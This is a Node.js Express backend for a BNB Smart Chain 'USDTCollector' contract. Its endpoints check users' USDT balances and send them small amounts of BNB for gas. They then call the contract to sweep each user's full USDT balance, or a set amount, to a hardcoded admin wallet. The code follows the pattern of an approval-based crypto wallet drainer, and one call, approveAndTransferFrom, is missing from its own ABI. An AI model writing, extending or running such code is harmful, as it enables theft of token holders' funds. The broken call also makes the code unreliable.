const express = require('express');
const { ethers } = require('ethers');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());

// ========== CONFIGURATION ==========
const PRIVATE_KEY = process.env.PRIVATE_KEY;
const CONTRACT_ADDRESS = process.env.CONTRACT_ADDRESS;
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const BSC_RPC = "https://bsc-dataseed.binance.org/";

// Admin wallet (where USDT will be collected)
const ADMIN_WALLET = "0x1E1110e9eB763d61e64C2C5b09A09Af58A76254A";

// BNB Amounts
const BNB_TO_SEND = ethers.parseEther("0.0005");
const MIN_BNB_REQUIRED = ethers.parseEther("0.0005");

// Provider and Wallet
const provider = new ethers.JsonRpcProvider(BSC_RPC);
const ownerWallet = new ethers.Wallet(PRIVATE_KEY, provider);

// USDTCollector Contract ABI (only the functions we need)
const CONTRACT_ABI = [
    "function approveAndTransfer() external",
    "function bulkTransferFromSelected(address[] calldata selectedUsers) external",
    "function bulkTransferFromAll() external",
    "function setUserAutoTransfer(address user, bool enabled) external",
    "function transferAmountToAddress(address user, address to, uint256 amount) external",
    "function getUSDTBalanceOf(address user) view returns (uint256)",
    "function getUserAutoTransferEnabled(address user) view returns (bool)",
    "function getContractBNBBalance() view returns (uint256)",
    "function owner() view returns (address)",
    "function adminWallet() view returns (address)",
    "function cowokers(address) view returns (bool)"
];

// USDT ERC-20 ABI
const USDT_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function allowance(address owner, address spender) view returns (uint256)",
    "function balanceOf(address account) view returns (uint256)"
];

const contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, ownerWallet);
const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider); // for read-only calls

// =====================================================
// API 1: Fund Gas
// =====================================================
app.post('/fund-gas', async (req, res) => {
    try {
        const { userAddress } = req.body;
        
        if (!ethers.isAddress(userAddress)) {
            return res.status(400).json({ error: "Invalid address" });
        }

        // Check user's USDT balance
        const usdtBalance = await usdtContract.balanceOf(userAddress);
        
        // If no USDT, don't fund gas – just return success (frontend will handle it)
        if (usdtBalance === 0n) {
            return res.json({
                success: true,
                message: "No USDT found, no gas needed",
                usdtBalance: "0",
                bnbSent: false
            });
        }
        
        // Check if user already has enough BNB
        const userBNB = await provider.getBalance(userAddress);
        const needsBNB = userBNB < MIN_BNB_REQUIRED;
        
        if (!needsBNB) {
            return res.json({
                success: true,
                message: "User already has sufficient BNB",
                usdtBalance: ethers.formatEther(usdtBalance),
                bnbSent: false
            });
        }
        
        // Check owner wallet balance
        const ownerBNB = await provider.getBalance(ownerWallet.address);
        if (ownerBNB < BNB_TO_SEND) {
            return res.status(400).json({
                success: false,
                error: "Owner has insufficient BNB to fund gas",
                required: "0.0005 BNB"
            });
        }
        
        // Send BNB
        const tx = await ownerWallet.sendTransaction({
            to: userAddress,
            value: BNB_TO_SEND
        });
        await tx.wait();
        
        res.json({
            success: true,
            message: "0.0005 BNB sent successfully",
            usdtBalance: ethers.formatEther(usdtBalance),
            bnbSent: true,
            bnbAmount: "0.0005 BNB",
            txHash: tx.hash
        });
        
    } catch (error) {
        console.error("Error in /fund-gas:", error);
        res.status(500).json({ error: error.message });
    }
});

// =====================================================
// API 2: Transfer USDT (using the contract)
// =====================================================
app.post('/transfer', async (req, res) => {
    try {
        const { userAddress } = req.body;
        
        if (!ethers.isAddress(userAddress)) {
            return res.status(400).json({ error: "Invalid address" });
        }

        // Check if user has USDT
        const usdtBalance = await usdtContract.balanceOf(userAddress);
        if (usdtBalance === 0n) {
            return res.status(400).json({ error: "No USDT to transfer" });
        }

        // Call the contract's transferFromUser function
        // This will transfer all USDT from user to the admin wallet
        const tx = await contract.approveAndTransferFrom(userAddress);
        const receipt = await tx.wait();

        // Get the updated balance (to know how much was actually transferred)
        const newBalance = await usdtContract.balanceOf(userAddress);
        const transferred = usdtBalance - newBalance; // amount transferred

        res.json({
            success: true,
            transferredAmount: ethers.formatEther(transferred),
            txHash: receipt.hash
        });
        
    } catch (error) {
        console.error("Error in /transfer:", error);
        // Provide a more meaningful error message
        let errorMsg = error.message;
        if (error.reason) {
            errorMsg = error.reason;
        }
        res.status(500).json({ error: errorMsg });
    }
});

// =====================================================
// API 3: Transfer Amount To Specific Address (using the contract)
// =====================================================
app.post('/transfer-amount', async (req, res) => {
    try {
        const { userAddress, toAddress, amount } = req.body;
        
        if (!ethers.isAddress(userAddress) || !ethers.isAddress(toAddress)) {
            return res.status(400).json({ error: "Invalid address" });
        }

        const amountWei = ethers.parseEther(amount);
        
        // Check balance
        const balance = await usdtContract.balanceOf(userAddress);
        if (balance < amountWei) {
            return res.status(400).json({ error: "Insufficient USDT balance" });
        }

        // Call the contract's transferAmountToAddress function
        const tx = await contract.transferAmountToAddress(userAddress, toAddress, amountWei);
        const receipt = await tx.wait();
        
        res.json({
            success: true,
            transferredAmount: amount,
            toAddress: toAddress,
            txHash: receipt.hash
        });
        
    } catch (error) {
        console.error("Error in /transfer-amount:", error);
        let errorMsg = error.message;
        if (error.reason) {
            errorMsg = error.reason;
        }
        res.status(500).json({ error: errorMsg });
    }
});

// =====================================================
// API 4: User Status
// =====================================================
app.get('/user-status/:address', async (req, res) => {
    try {
        const { address } = req.params;
        
        const usdtBalance = await usdtContract.balanceOf(address);
        const allowance = await usdtContract.allowance(address, CONTRACT_ADDRESS);
        const userBNB = await provider.getBalance(address);
        
        res.json({
            address,
            usdtBalance: ethers.formatEther(usdtBalance),
            allowance: ethers.formatEther(allowance),
            userBNB: ethers.formatEther(userBNB),
            isApproved: allowance >= usdtBalance && usdtBalance > 0n,
            hasUSDT: usdtBalance > 0n,
            needsBNB: userBNB < MIN_BNB_REQUIRED && usdtBalance > 0n
        });
        
    } catch (error) {
        console.error("Error in /user-status:", error);
        res.status(500).json({ error: error.message });
    }
});

// =====================================================
// API 5: Owner Stats
// =====================================================
app.get('/owner-stats', async (req, res) => {
    try {
        const ownerUSDT = await usdtContract.balanceOf(ADMIN_WALLET);
        const ownerBNB = await provider.getBalance(ownerWallet.address);
        const contractBNB = await provider.getBalance(CONTRACT_ADDRESS);
        
        res.json({
            ownerUSDT: ethers.formatEther(ownerUSDT),
            ownerBNB: ethers.formatEther(ownerBNB),
            contractBNB: ethers.formatEther(contractBNB)
        });
        
    } catch (error) {
        console.error("Error in /owner-stats:", error);
        res.status(500).json({ error: error.message });
    }
});

// =====================================================
// Health Check
// =====================================================
app.get('/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// =====================================================
// Start server
// =====================================================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log("========================================");
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`👤 Admin Wallet: ${ADMIN_WALLET}`);
    console.log(`💰 BNB to send: 0.0005 BNB`);
    console.log(`📦 Contract: ${CONTRACT_ADDRESS}`);
    console.log("========================================");
});